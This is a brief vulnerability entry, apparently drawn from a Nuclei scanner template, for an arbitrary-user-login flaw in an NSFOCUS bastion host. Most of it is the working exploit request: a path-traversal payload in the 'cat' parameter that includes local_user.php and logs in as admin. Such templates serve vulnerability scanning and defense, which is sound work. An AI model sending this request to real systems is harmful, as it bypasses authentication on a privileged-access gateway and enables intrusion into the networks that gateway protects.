# Vulnerability: Nsfocus - Arbitrary User Login
**Classification:** NSFOCUS
**Source:** Nuclei Template (`nsfocus-auth-bypass.yaml`)

## Description
Nsfocus bastion host has an arbitrary user login vulnerability. Attackers can use the vulnerability to log in any user by including www/local_user.php

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
```

